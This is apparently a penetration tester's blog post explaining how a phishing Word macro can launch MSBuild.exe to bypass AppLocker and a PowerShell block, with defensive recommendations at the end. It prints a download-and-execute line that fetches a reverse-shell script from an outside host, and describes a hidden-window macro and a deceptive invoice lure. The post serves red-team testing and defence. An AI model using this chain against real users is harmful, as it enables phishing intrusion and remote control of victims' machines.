---
layout: post
title: MSBuild AppLocker Bypass Phishing Payload
published: true
---
![msbuild]({{ site.url }}/images/msbuild-csproj.png){: .center-image }


### With regular external vulnerability scans and (hopefully) pentration tests being undertaken, the perimeter is typically not the easy route into an organisation.

People click, and so simulated phishing campaigns and user awareness training are extremely important. However, there can never be complete assurance against credential divulgence or execution of malicious code via targetted (or not so targetted) phishing attacks, and so it is critical that organisations implement a multi-layered "defence in depth" strategy. Application Whitelisting is an important component of such a strategy, and is an effective means of ensuring that only approved applications can run.

AppLocker is a commonly used whitelisting technology and is built into Windows. Commonly, the default AppLocker rules (listed below) are applied.

![rules]({{ site.url }}/images/applocker-default-rules.png){: .center-image }

Since Powershell has gained recognition for being the attacker's language of choice, organisations are increasingly blocking it. However, blocking powershell.exe alone is not sufficient as there are many methods by which PowerShell can be instantiated to send a reverse shell reaching out of the organisation to an attacker.

This post will document one such method, the (as Casey Smith puts it) "misplaced trust" binary MSBuild.exe. In this scenario, the company has enabled AppLocker with Default Rules and has also blocked powershell.exe.

![rules]({{ site.url }}/images/applocker-rules.png){: .center-image }

Assuming that MSBuild.exe is allowed, we can invoke it to execute a ".csproj" (Visual Studio .NET C# Project file) and instantiate a Powershell runspace using the System.Management.Automation.dll assembly. The powashell.csproj file below by Casey Smith ([@SubTee](https://twitter.com/subtee)) builds upon Jared Atkinson's ([@jaredcatkinson](https://twitter.com/jaredcatkinson)) and Justin Warner's ([@sixdub](https://twitter.com/sixdub)) work.

<script src="https://gist.github.com/egre55/7a6b6018c9c5ae88c63bdb23879df4d0.js"></script>

It then executes the second stage of our payload via a PowerShell 3.0+ download cradle:

`pipeline.Commands.AddScript("IEX (iwr 'http://10.10.10.10/shell.ps1')");`

shell.ps1:

<script src="https://gist.github.com/egre55/c058744a4240af6515eb32b2d33fbed3.js"></script>

Good. Now we need a means of delivering the project file and executing MSBuild. The macro below will do just this.

<script src="https://gist.github.com/egre55/563159175f8d6c1d31d7f3af77357549.js"></script>

The `WindowType` parameter of the Shell function has been set to `vbHide` in order to avoid calling attention to our activities. Now, in order to stand a chance of the macro being executed, we need to dress the document appropriately.

John Lambert ([@JohnLaTwC](https://twitter.com/johnlatwc)) regularly shares interesting phishing lures and payloads, if you need inspiration for your simulated phishing campaigns. The "Document created in newer/older Office version" lure is one I find especially convincing. John has also put together [this](https://t.co/OwH28ltngy) compendium of macro based lures, which is great for educating users about the different techniques attackers use.

FailedPayment.doc lure:

![lure]({{ site.url }}/images/phishing-lure.png){: .center-image }

Now that the "malicious" document has been created we can test it out. Once the user opens the document and enables macros, our powashell.csproj is downloaded for MSBuild to execute, which in turn downloads and executes the Powershell reverse shell one-liner. All completely invisible to the user.

![rules]({{ site.url }}/images/shell.png){: .center-image }

We can see that this payload is also an effective means of bypassing PowerShell Contrained Language mode. This was not a particularly stealthy attack as the .csproj is written to disk, and no attempt was made to obfuscate any part of the payload.

Hopefully, this example highlights the danger of "misplaced trust" binaries such as MSBuild. Organisations should block their use unless explicitely required for certain users (e.g. developers). Organisations should also consider blocking Office Macros for users who don't need this functionality, and implement a custom whitelisting policy, mindful of the permissiveness of AppLocker Default Rules. Oddvar Moe ([@Oddvarmoe](https://twitter.com/oddvarmoe)) maintains an excellent [collection](https://github.com/api0cradle/UltimateAppLockerByPassList) of AppLocker bypass techniques, which is a good list of the "misplaced trust" binaries that IT departments should consider blocking. In addition to powershell.exe, organisations should also consider blocking the following PowerShell binaries and assemblies.

<script src="https://gist.github.com/egre55/61b6cd2b23b605e6a017e81e5cb97f3e.js"></script>

Yet as mentioned, even after blocking the above, there are multiple methods an attacker could use to instantiate a Powershell runspace. For example, an attacker could download a custom binary to one of the writable and executable folders within Windows that are whitelisted by AppLocker Default Rules. These folders can be audited using [this](https://raw.githubusercontent.com/3gstudent/Bypass-Windows-AppLocker/master/AppLockerBypassChecker-v1.ps1) PowerShell script by Tom Aafloen. On my computer, they are:

<script src="https://gist.github.com/egre55/47186f7a22de177af4785e80fc2dcb41.js"></script>

These folders can then be blocked from being executable ... and so this attacker/defender back and forth continues ad infinitum.

It is important for organisations to formalise an ongoing cycle of testing, remediation and review, in order to achieve stronger system security. An "assume breach" mentality is also useful, as well as focusing on efforts to make it as hard as possible for an attacker to gain that initial foothold.
